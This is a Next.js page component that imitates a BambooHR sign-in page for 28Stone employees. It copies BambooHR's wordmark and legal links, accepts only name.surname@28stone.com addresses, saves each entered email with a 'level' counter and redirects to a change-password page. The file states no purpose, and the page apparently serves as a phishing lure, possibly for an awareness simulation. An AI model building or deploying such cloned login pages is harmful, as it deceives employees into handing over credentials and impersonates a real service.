'use client'

import React, { useState, useRef, useEffect } from 'react';
import Image from 'next/image';
import styles from './page.module.css';

export default function Home() {
    const [email, setEmail] = useState("");
    const caretPos = useRef();
    const ref = useRef(null);

    function getCaretPosition(el) {
        if (el.selectionStart || el.selectionStart === '0') {
            return {
                start: el.selectionStart,
                end: el.selectionEnd
            };
        }
        return { start: 0, end: 0 };
    }

    function setCaretPosition(el, pos) {
        if (el && pos && el.setSelectionRange) {
            el.setSelectionRange(pos.start, pos.end);
        }
    }

    function handleChange(e) {
        caretPos.current = getCaretPosition(ref.current);
        setEmail(e.target.value);
    }

    useEffect(() => {
        ref.current.style.height = 'auto';
        ref.current.style.height = `${ref.current.scrollHeight}px`;
        setCaretPosition(ref.current, caretPos.current);
    }, [email]);

    async function handleLogin() {
        const emailRegex = /^[a-zA-Z]+\.[a-zA-Z]+@28stone\.com$/;
        
        if (!emailRegex.test(email)) {
            alert("Неверный формат email. Введите в формате name.surname@28stone.com");
            return;
        }
    
        try {
            localStorage.setItem("userEmail", email); 
    
            const response = await fetch("/api/saveEmail", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ email, level: 0 })
            });
    
            if (response.ok) {
                window.location.href = "/changePassword";
            } else {
                alert("Ошибка при сохранении email");
            }
        } catch (error) {
            console.error("Ошибка запроса:", error);
            alert("Не удалось сохранить email");
        }
    }
    

    return (
        <>
            <div className={styles.container}>
                <div className={styles.white_container}>
                    <div className={styles.title}>
                        <Image
                            src="/28stone.jpg"
                            width={151}
                            height={60}
                            alt="28Stone logo"
                        />
                    </div>

                    <textarea
                        id="pswdbox"
                        className={styles.pswdbox}
                        value={email}
                        onChange={handleChange}
                        rows={1}
                        style={{ resize: 'none', width: "100%", overflowY: 'hidden' }}
                        spellCheck="false"
                        placeholder="Email Address"
                        ref={ref}
                    />

                    <button className={`${styles.logInBtn} button`} onClick={handleLogin}>
                        Log in
                    </button>

                </div>
            </div>

            <footer className={styles.footer}>
                <a className={`${styles.flex_1} ${styles.gray_link}`} href="https://www.bamboohr.com/legal/privacy-policy" target="_blank">Privacy Policy</a>&nbsp;·&nbsp;
                <a className={`${styles.flex_1} ${styles.gray_link}`} href="https://www.bamboohr.com/legal/terms-of-service" target="_blank">Terms of Service</a>
                <div className={styles.placeholder}></div>
                <svg className={styles.flex_1} xmlns="http://www.w3.org/2000/svg" viewBox="0 0 3383 512" width="115px" height="17px">
                    <path fill="#777270" d="M472.4 162.2c-61.4 0-94.3 21.1-117.4 44l-6.3 6.6V0h-53.1v343.8c0 103.6 79.8 168.2 171.4 168.2c100.9 0 177.3-77.7 177.3-177.5c0-92.7-79.7-172.3-172-172.3zM467 462.8c-66.8 0-123.5-52.7-123.5-123.3s47.7-128.6 124.6-128.6 122.2 62.2 122.2 127.4c0 70.9-48 124.6-123.5 124.6zM967.1 220.4h-.7c-22.6-26.6-57.3-58-116.8-58c-97.6 0-171.4 73-171.4 174.1c0 106.5 79.3 175.5 168 175.5c55.3 0 95.6-26.6 119.5-55.3h1.4v43.7h53.9V173.3h-53.9v47.1zM850.3 462.9c-79.8 0-118.3-64.3-118.3-126.4s38.5-125.7 119.6-125.7c63.5 0 115.5 50.7 115.5 127.7c0 73-56.1 124.3-116.9 124.3zm593.8-300.5c-56.7 0-96.3 34.8-112.6 67.6c-13.7-38.2-55.3-67.6-106.5-67.6c-42.3 0-75.8 22.6-97.6 51.8h-1.4v-41h-54v327.1h54V318.7c0-68.3 34.8-107.9 89.4-107.9c48.5 0 77.8 41 77.8 94.9v194.6h54.7V318.7c0-75.1 43.1-107.9 88.8-107.9c55.3 0 78.5 44.3 78.5 94.9v194.6h53.9V309.9c0-96.3-51.2-147.5-125-147.5zm724.9 0c-98.4 0-174.8 73-174.8 174.1S2070 512 2169 512 2343.8 432.8 2343.8 336.5 2270.8 162.4 2169 162.4zm0 300.4c-62.8 0-118.8-52.6-118.8-126.3s49.2-125.6 118.8-125.6 118.8 56.7 118.8 125.6-49.8 126.3-118.8 126.3zM1788.3 162.2c-61.4 0-94.3 21.1-117.4 44l-6.3 6.6V25.6h-53.1v318.2c0 103.6 79.8 168.2 171.4 168.2c100.9 0 177.3-77.7 177.3-177.5c0-92.7-79.7-172.3-172-172.3zm-5.4 300.6c-66.8 0-123.5-52.7-123.5-123.3s47.7-128.6 124.6-128.6 122.2 62.2 122.2 127.4c0 70.9-48 124.6-123.5 124.6z"></path>
                </svg>
            </footer>
        </>
    );
}
